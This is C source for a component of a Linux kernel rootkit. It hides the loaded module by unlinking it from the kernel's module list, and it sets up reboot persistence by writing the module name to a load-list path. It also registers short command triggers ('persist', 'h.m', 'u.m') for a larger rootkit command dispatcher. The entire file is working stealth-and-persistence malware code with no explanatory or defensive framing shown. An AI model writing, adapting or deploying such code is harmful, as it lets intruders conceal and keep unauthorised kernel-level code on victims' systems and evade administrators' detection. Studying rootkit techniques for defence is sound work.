// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/spinlock.h>

/* Module hiding */

static struct list_head *saved_prev;
static DEFINE_SPINLOCK(module_lock);

void rk_module_hide(void)
{
	unsigned long flags;

	spin_lock_irqsave(&module_lock, flags);
	if (saved_prev)
		goto out;
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
out:
	spin_unlock_irqrestore(&module_lock, flags);
}

void rk_module_unhide(void)
{
	unsigned long flags;

	spin_lock_irqsave(&module_lock, flags);
	if (!saved_prev)
		goto out;
	list_add(&THIS_MODULE->list, saved_prev);
	saved_prev = NULL;
out:
	spin_unlock_irqrestore(&module_lock, flags);
}

bool rk_module_hidden(void)
{
	unsigned long flags;
	bool hidden;

	spin_lock_irqsave(&module_lock, flags);
	hidden = saved_prev != NULL;
	spin_unlock_irqrestore(&module_lock, flags);
	return hidden;
}

/* Persistence */

static int rk_persist(void)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	kernel_write(f, MODULE_NAME_STR "\n", sizeof(MODULE_NAME_STR), &pos);
	filp_close(f, NULL);
	return 0;
}

static int rk_unpersist(void)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	kernel_write(f, "", 0, &pos);
	filp_close(f, NULL);
	return 0;
}

/* Command handlers */

static int cmd_persist(const char *arg) { return rk_persist(); }
static int cmd_unpersist(const char *arg) { return rk_unpersist(); }
static int cmd_hide_module(const char *arg) { rk_module_hide(); return 0; }
static int cmd_unhide_module(const char *arg) { rk_module_unhide(); return 0; }

static const struct rk_cmd_entry module_cmds[] = {
	{ "persist",   cmd_persist },
	{ "unpersist", cmd_unpersist },
	{ "h.m",       cmd_hide_module },
	{ "u.m",       cmd_unhide_module },
};

int rk_module_cmds_init(void)
{
	return rk_cmds_register(module_cmds, ARRAY_SIZE(module_cmds));
}
